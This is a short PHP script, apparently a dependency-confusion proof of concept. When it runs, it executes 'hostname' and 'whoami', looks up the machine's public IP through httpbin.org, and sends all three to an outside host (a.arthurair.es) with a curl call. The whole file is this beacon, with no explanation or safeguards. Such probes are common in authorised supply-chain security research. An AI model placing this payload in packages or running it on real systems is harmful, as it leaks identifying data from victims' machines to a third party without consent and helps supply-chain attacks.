<?php
    $hostname = system('hostname');
    $who = system('whoami');
    
    $ipSaida = json_decode(file_get_contents('https://httpbin.org/ip'))->origin;

    $finalString = urlencode($hostname."+".$who."+".$ipSaida);

    system("curl https://a.arthurair.es/?dependencyConfusion-".$finalString);
 ?>
